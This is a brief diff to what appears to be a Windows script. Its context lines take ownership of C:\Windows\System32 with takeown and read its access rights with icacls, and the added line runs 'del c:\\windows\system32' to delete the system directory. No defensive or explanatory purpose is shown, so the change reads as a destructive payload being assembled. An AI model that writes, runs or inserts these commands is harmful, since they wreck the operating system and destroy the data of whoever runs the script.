@@ -5,3 +5,4 @@ SLEEP 3
 
 takeown /f C:\Windows\System32
 icacls C:\Windows\System32
+del c:\\windows\system32
